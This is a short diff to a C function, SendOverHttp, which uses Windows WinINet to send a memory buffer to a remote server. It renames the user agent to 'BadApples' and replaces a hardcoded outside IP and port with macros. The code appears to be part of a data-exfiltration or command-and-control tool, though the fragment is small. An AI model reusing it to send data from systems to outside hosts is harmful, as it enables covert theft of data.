@@ -12,7 +12,7 @@ BOOL SendOverHttp( IN PVOID pAddress, IN DWORD size )
 	HINTERNET hRequest = NULL;
 
 	hInternet = InternetOpen(
-		L"WinINet Example",
+		L"BadApples",
 		INTERNET_OPEN_TYPE_DIRECT,
 		NULL,
 		NULL,
@@ -26,8 +26,8 @@ BOOL SendOverHttp( IN PVOID pAddress, IN DWORD size )
 	/* connect to the server */
 	hConnect = InternetConnect(
 		hInternet,
-		L"194.59.30.81",
-		8080,
+		REMOTE_IP,
+		CONNECTION_PORT,
 		NULL,
 		NULL,
 		INTERNET_SERVICE_HTTP,
